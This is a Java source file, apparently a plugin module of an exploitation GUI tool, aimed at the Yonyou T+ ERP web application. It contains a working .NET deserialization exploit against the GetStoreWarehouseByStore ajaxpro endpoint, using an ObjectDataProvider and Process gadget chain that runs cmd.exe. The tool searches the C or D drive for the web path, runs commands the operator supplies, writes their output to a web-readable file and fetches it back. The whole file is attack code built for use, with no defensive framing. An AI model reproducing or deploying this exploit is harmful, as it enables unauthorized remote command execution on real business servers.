package exp.oa.yongyou.tplus;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;


public class yongyou_tplus_GetStoreWarehouseByStore_serial implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type", "application/json");
            head.put("X-Ajaxpro-Method","GetStoreWarehouseByStore");

            String payload = "{\n" +
                    "  \"storeID\":{ }\n" +
                    "}";

            Response post_res = HttpTools.post(url + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore", payload , head, "utf-8");
            if (post_res.getCode() == 200 && post_res.getText().contains("actorId:,archivesId:78")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_tplus_GetStoreWarehouseByStore_serial ]");
                    textArea.appendText("\n 涉及多文件创建，谨慎使用");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_tplus_GetStoreWarehouseByStore_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    public String att_payload(String url,String pan ,TextArea textArea){
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type", "application/json");
            head.put("X-Ajaxpro-Method","GetStoreWarehouseByStore");

            String payload = "{\n" +
                    "                    \"storeID\":{\n" +
                    "                \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
                    "                        \"MethodName\":\"Start\",\n" +
                    "                        \"ObjectInstance\":{\n" +
                    "                    \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                    "                            \"StartInfo\": {\n" +
                    "                        \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                    "                                \"FileName\":\"cmd\", \"Arguments\":\"/c for /r " + pan +":\\ %z in (login.css*) do echo %z > %z/../R4gd0ll.txt\"\n" +
                    "                    }\n" +
                    "                }\n" +
                    "            }\n" +
                    "}";

            Response pwd_res = HttpTools.post(url + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore", payload , head, "utf-8");
            if (pwd_res.getCode() == 200 && pwd_res.getText().contains("actorId:,archivesId:78")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 正在探测绝对路径，当前磁盘: "+ pan +"盘");
                });
                Response c_res = HttpTools.get(url + "/tplus/css/login/R4gd0ll.txt",head,"utf-8");
                if (c_res.getCode() == 200 && c_res.getText().contains(pan+":")){
                    String pwd = c_res.getText();
                    textArea.appendText("\n 路径探测成功，当前路径为: "+pwd);
                    return pwd;
                }else{
//                    Platform.runLater(() -> {
//                        textArea.appendText("\n 路径探测失败");
//                    });
                    return null;
                }
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 路径探测失败，构造回显失败");
                });
                return null;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
            return null;
        }
    }

    private Boolean attcmd(String url,String cmd ,TextArea textArea,TextArea textArea_cmd) {

        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type", "application/json");
            head.put("X-Ajaxpro-Method","GetStoreWarehouseByStore");
            String pan_C = "C";
            String pan_D = "D";
            String pwd;
            if (att_payload(url,pan_C,textArea) != null){
                pwd = att_payload(url,pan_C,textArea).replace(" ","").replace("\\","\\\\").replace("\n","");

            }else{
                pwd = att_payload(url,pan_D,textArea).replace(" ","").replace("\\","\\\\").replace("\n","");

            }

            int b = pwd.indexOf("login.css");
//            System.out.println(b);

            String c = pwd.substring(0,b)+"R4gd0ll.txt";

            String cmd_payload = "{\n" +
                    "        \"storeID\":{\n" +
                    "            \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
                    "                    \"MethodName\":\"Start\",\n" +
                    "                    \"ObjectInstance\":{\n" +
                    "                \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                    "                        \"StartInfo\": {\n" +
                    "                    \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                    "                            \"FileName\":\"cmd\", \"Arguments\":\"/c "+cmd+" > "+c+"\"\n" +
                    "                }\n" +
                    "            }\n" +
                    "        }\n" +
                    "    }";
            Response post_res = HttpTools.post(url + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore", cmd_payload , head, "utf-8");
            if (post_res.getCode() == 200 && post_res.getText().contains("actorId:,archivesId:78")) {
                Response cmd_res = HttpTools.get(url + "/tplus/css/login/R4gd0ll.txt",head,"gbk");
                if (cmd_res.getCode() == 200 && cmd_res.getText() != null){
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+cmd+" 执行成功");
                        textArea_cmd.appendText(cmd_res.getText());
                    });
                    return true;
                }else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+cmd+" 执行失败");
                    });
                    return false;
                }

            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_tplus_GetStoreWarehouseByStore_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

}
